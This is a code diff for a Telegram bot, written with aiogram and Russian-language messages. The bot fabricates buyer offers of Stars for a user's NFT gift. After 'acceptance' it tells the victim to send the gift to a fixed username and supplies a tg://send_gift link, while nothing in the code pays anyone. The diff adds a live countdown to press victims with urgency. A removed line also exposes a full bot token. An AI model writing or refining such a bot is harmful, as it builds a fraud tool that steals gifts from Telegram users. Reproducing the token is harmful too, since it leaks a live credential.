@@ -1,18 +1,23 @@
 import asyncio
 import logging
 import re
+from datetime import datetime, timedelta
 
 from aiogram import Bot, Dispatcher, F
 from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
 from aiogram.enums import ParseMode
 
-BOT_TOKEN = "8850115069:AAHt8yX4-4gswis3VY4mmO2zj_ipBjkK2s4"  # вставь свой токен
-current_buyer = "faqux"
+BOT_TOKEN = "8850115069:AA..."  # вставь свой токен
+BUYER = "legitimy"
 DEFAULT_STARS = 7000
+OFFER_DURATION_HOURS = 6  # сколько часов действует оффер
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
+
+# chat_id -> expiry datetime
+offer_expiry = {}
 
 
 def parse_gift(text: str):
@@ -35,6 +40,17 @@ def parse_gift(text: str):
     }
 
 
+def format_remaining(expiry: datetime) -> str:
+    now = datetime.utcnow()
+    if expiry <= now:
+        return "0ч 0м"
+    delta = expiry - now
+    total_minutes = int(delta.total_seconds() // 60)
+    hours = total_minutes // 60
+    minutes = total_minutes % 60
+    return f"{hours}ч {minutes}м"
+
+
 @dp.message()
 async def on_msg(message: Message):
     text = message.text or ""
@@ -43,12 +59,16 @@ async def on_msg(message: Message):
         await message.answer("Кинь ссылку t.me/nft/... и цену")
         return
 
+    expiry = datetime.utcnow() + timedelta(hours=OFFER_DURATION_HOURS)
+    offer_expiry[message.chat.id] = expiry
+    remaining = format_remaining(expiry)
+
     offer_text = (
-        f"<b>Пользователь {current_buyer} предлагает Вам {gift['stars']} Stars за подарок "
+        f"<b>Пользователь {BUYER} предлагает Вам {gift['stars']} Stars за подарок "
         f"<a href=\"{gift['link']}\">{gift['gift_name']}</a>.</b>\n\n"
-        f"Предложение действует ещё <b>5ч 59м</b>."
+        f"Предложение действует ещё <b>{remaining}</b>."
     )
-    cb_data = f"acc|{gift['stars']}|{gift['gift_name'][:20]}"
+    cb_data = f"acc|{gift['stars']}|{gift['gift_name'][:25]}"
     kb = InlineKeyboardMarkup(inline_keyboard=[[
         InlineKeyboardButton(text="✗ Отклонить", callback_data="dec"),
         InlineKeyboardButton(text="✓ Принять", callback_data=cb_data)
@@ -70,8 +90,11 @@ async def on_dec(cb: CallbackQuery):
 @dp.callback_query(F.data.startswith("acc|"))
 async def on_acc(cb: CallbackQuery):
     parts = cb.data.split("|", 2)
-    stars = parts[1] if len(parts) > 1 else "7000"
+    stars = parts[1] if len(parts) > 1 else str(DEFAULT_STARS)
     gift_name = parts[2] if len(parts) > 2 else "подарок"
+
+    expiry = offer_expiry.get(cb.message.chat.id)
+    remaining = format_remaining(expiry) if expiry else "0ч 0м"
 
     alert_text = (
         f"Предложение о продаже {gift_name} успешно принято.\n\n"
@@ -79,22 +102,26 @@ async def on_acc(cb: CallbackQuery):
     )
     await cb.answer(alert_text, show_alert=True)
 
-    # Also update the message
+    transfer_url = f"tg://send_gift?to={BUYER}"
+    success_text = (
+        f"<b>Предложение о продаже {gift_name} успешно принято.</b>\n\n"
+        f"Передайте подарок покупателю для зачисления {stars} Stars на ваш баланс.\n\n"
+        f"Осталось: <b>{remaining}</b>"
+    )
     try:
         await cb.message.edit_text(
-            f"<b>Предложение о продаже {gift_name} успешно принято.</b>\n\n"
-            f"Передайте подарок покупателю для зачисления {stars} Stars на ваш баланс.",
+            success_text,
             reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
-                InlineKeyboardButton(text="Передать", url=f"https://t.me/{current_buyer}")
+                InlineKeyboardButton(text="Передать", url=transfer_url)
             ]]),
             parse_mode=ParseMode.HTML
         )
     except Exception:
-        pass
+        await cb.message.edit_text(success_text, parse_mode=ParseMode.HTML)
 
 
 async def main():
-    print("Alert bot started")
+    print("Alert + real timer bot started")
     await dp.start_polling(bot)
 
 
